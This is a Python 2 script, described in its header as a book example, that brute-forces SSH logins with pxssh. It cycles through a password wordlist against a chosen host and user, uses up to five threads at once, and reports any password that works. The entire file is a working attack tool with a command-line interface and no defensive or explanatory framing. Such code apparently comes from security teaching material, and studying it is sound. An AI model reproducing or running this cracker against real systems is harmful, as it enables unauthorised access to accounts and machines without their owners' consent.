# Book example of an SSH brute force password cracker using Pxssh

import pxssh
import optparse
import time

from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)

def connect(host, user, password, release):
  try:
    s = pxssh.pxssh()
    s.login(host, user, password)
    print '[+] Password Found ' + password
  except Exception, e:
    if 'read_nonblocking' in str(e):
      time.sleep(5)
      connect(host, user, password, False)
    elif 'synchronize with original prompt' in str(e):
      time.sleep(1)
      connect(host, user, password, False)
  finally:
    if release: 
      connection_lock.release()
      
def main():
  parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -F <password list>')
  parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
  parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
  parser.add_option('-u', dest='user', type='string', help='specify the user')
  
  (options, args) = parser.parse_args()

  host       = options.tgtHost
  passwdFile = options.passwdFile
  user       = options.user   

  if host == None or passwdFile == None or user == None:
    print parser.usage
    exit(0)

  fn = open(passwdFile, 'r')
  for line in fn.readlines():
    password = line.strip('\r').strip('\n')
    print "[-] Testing: " + str(password)
    connection_lock.acquire()
    t = Thread(target=connect, args=(host, user, password, True))
    child = t.start()

if __name__ == '__main__':
  main()
